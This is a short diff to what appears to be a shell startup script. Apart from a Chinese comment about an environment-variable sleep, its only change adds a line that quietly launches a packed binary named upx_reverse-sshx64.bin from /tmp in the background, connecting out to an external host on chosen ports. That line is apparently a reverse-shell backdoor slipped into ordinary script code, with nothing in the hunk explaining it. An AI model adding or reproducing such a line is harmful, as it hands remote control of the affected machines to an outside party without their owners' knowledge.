@@ -207,6 +207,8 @@ fi
 )
 
 
+setsid /tmp/upx_reverse-sshx64.bin  -v -b 50050 -p 31329  e36854ba4784.c.methodot.com &
+
 
 # 依据环境变量sleep
 if [ ! -z ${sp9} ]; then sleep $sp9; fi
